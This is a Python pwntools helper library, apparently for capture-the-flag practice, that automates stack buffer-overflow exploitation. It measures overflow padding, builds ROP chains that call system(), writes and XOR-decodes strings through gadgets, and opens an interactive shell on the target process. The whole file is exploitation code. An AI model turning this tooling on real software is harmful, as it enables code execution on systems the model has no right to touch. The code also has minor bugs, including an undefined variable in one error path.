#!/usr/bin/env python

from pwn import *

class PAPA_ROP:

    def __init__(self, filename):
        # Core members
        self.filename = filename
        self.elf = context.binary = ELF(filename)
        self.rop = ROP(self.elf)
        self.arch = self.elf.get_machine_arch()
        self.payload = ""
        self.args = []
        
        # Customizations
        self.auto_construct_payload = True
        context.delete_corefiles = True
    
    #####################################
    ##### MANUAL PAYLOAD GENERATION #####
    #####################################

    # Generate padding before overflow
    def get_padding(self):
        payload = "A"*self.get_padding_length()
        self.payload_append(payload)
        return payload

    # Get all the functions of the binary
    def get_functions(self):
        return self.elf.functions

    # Get the specified function address
    def get_function_addr(self, function):
        return self.elf.functions[function].address

    # Get the specified symbol address
    def get_symbol_addr(self, symbol):
        return self.elf.symbols[symbol]

    # Get the specified string address
    def get_string_addr(self, string):
        return list(self.elf.search(string, False))[0]

    # Pack a value based on the binary architecture
    def p(self, value):
        if ("64" in self.arch):
            payload = p64(value)
        elif ("32" in self.arch or "86" in self.arch):
            payload = p32(value)
        else:
            log.failure("Unknown architecture: " + arch)
            exit(1)
        self.payload_append(payload)
        return payload
    
    # Write a string to a location using pop and mov gadgets:
    #       pop rDST; pop rSRC; ret (pop gadget)
    #       mov [rDST], rSRC; ret   0x08048899: pop esi; pop edi; ret;(mov gadget)
    # The reverse parameter implies that rDST and rSRC are not in the same order
    # between the gadgets:
    def pop_mov_write(self, pop, mov, what, where, reverse = False):
        # Disable auto construction
        tmp_setting = self.auto_construct_payload
        self.auto_construct_payload = False
        
        # Construct new payload
        payload = ""
        nbytes = 8 if ("64" in self.arch) else 4
        while (what):
            payload += self.p(pop)
            if (reverse):
                payload += what[:nbytes]              
                payload += self.p(where)
            else:
                payload += self.p(where)
                payload += what[:nbytes]
            payload += self.p(mov)
            what = what[nbytes:]
            where += nbytes

        # Reset auto construction
        self.auto_construct_payload = tmp_setting

        # Apply and return result
        self.payload_append(payload)
        return payload

    # XOR the bytes at a given address with a specified key using pop and
    # xor gadgets:
    #   pop rCIP; pop rKEY; ret;
    #   xor byte ptr rCIP, rKEY; ret;
    # The reverse parameter implies that rCIP and rKEY are not in the same
    # order between the gadgets
    def xor_decrypt(self, pop, xor, cipher_addr, key, reverse=False):
        # Disable auto construction
        tmp_setting = self.auto_construct_payload
        self.auto_construct_payload = False
 
        # Construct new payload
        payload = ""
        for key_char in key:
            payload += self.p(pop)
            if (reverse):
                payload += self.p(ord(key_char))
                payload += self.p(cipher_addr)
            else:
                payload += self.p(cipher_addr)
                payload += self.p(ord(key_char))
            payload += self.p(xor)
            cipher_addr += 1

        # Reset auto construction
        self.auto_construct_payload = tmp_setting

        # Apply and return result
        self.payload_append(payload)
        return payload

    ########################################
    ##### AUTOMATED PAYLOAD GENERATION #####
    ########################################

    # Add to the ROP chain to call system with the given argument
    def system(self, arg):
        self.rop.system(arg)
        return

    # Add to the ROP chain to call a function with the given arguments
    def call(self, function, args=[]):
        self.rop.call(function, args)
        return

    # Get the ROP chain payload
    def chain(self):
        payload = self.rop.chain()
        self.payload_append(payload)
        return payload

    ###############################
    ##### PROCESS INTERACTION #####
    ###############################
    def start_process(self):
        self.process = process(self.filename, self.args)
        return

    def start_debug(self, dbg_cmds='continue\n'):
        self.process = gdb.debug(self.filename + ' '.join(self.args), dbg_cmds)
        return

    def sendafter(self, delim, payload):
        self.process.sendafter(delim, payload)
        return

    def recvline(self):
        return self.process.recvline()

    def recvall(self):
        return self.process.recvall()

    def interactive(self):
        self.process.interactive()
        return

    def pwn(self, prompt='', pwn_type='SHELL'):
        self.start_process()
        self.payload = self.payload.rstrip() + '\n'
        self.sendafter(prompt, self.payload)
        if (pwn_type == 'READ_ALL'):
            return self.recvall()
        elif (pwn_type == 'READ_LINE'):
            return self.recvline()
        elif (pwn_type == 'SHELL'):
            return self.interactive()
        return

    #################################
    ##### MISC/HELPER FUNCTIONS #####
    #################################
    
    # Log all I/O
    def log_all(self, status):
        if (status == True):
            context.log_level = logging.DEBUG
        else:
            context.log_level = 20
        return

    # Append payload component if auto-construction enabled
    def payload_append(self, payload):
        if (self.auto_construct_payload):
            self.payload += payload
        return

    # Get the number of bytes before overflow occurs
    def get_padding_length(self):
        p = process(self.elf.path)
        p.sendline(cyclic(4096))
        p.wait()
        core = p.corefile
        try:
            sub = core.read(core.esp-4, 4)
        except:
            sub = core.read(core.rsp, 4)

        return cyclic_find(sub)

    # XOR encode to avoid bad characters in a string
    # "what" is the string to encode
    # "avoid" is a byte array of bad chars
    # Returns a (cipher, decrypt_key) tuple
    def xor_encode(self, what, avoid):
        cipher = ""
        decrypt_key = ""
        # Encode each character
        for char in what:
            plain = ord(char)
            # Check the character actually needs encoding
            if ((plain in avoid) or (0 in avoid)):
                # Find character to encode with
                found = False
                for key in range(256):
                    if ((key in avoid) or (plain ^ key in avoid)):
                        continue
                    cipher += chr(plain ^ key)
                    decrypt_key += chr(key)
                    found = True
                    break

                # Error if couldn't do conversion
                if (not found):
                    log.failure("Couldn't XOR encode: " + char)
                    exit(1)

            # Otherwise just xor with null
            else:
                cipher += char
                decrypt_key += "\x00"

        return (cipher, decrypt_key)

